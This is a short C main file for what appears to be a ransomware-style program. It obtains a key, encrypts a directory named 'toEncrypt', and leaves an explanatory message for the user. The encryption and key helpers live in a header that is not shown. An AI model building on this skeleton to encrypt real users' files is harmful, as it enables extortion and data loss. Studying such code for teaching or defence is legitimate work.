#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "src/libcom.h"

int main (int argc, char **argv){
  // get the key
  char* key;
  key = getKey();
  // encrypt the folder
  encDir("toEncrypt", key);
  // leave a message to the user
  leaveExplanation();

  return 0;
}
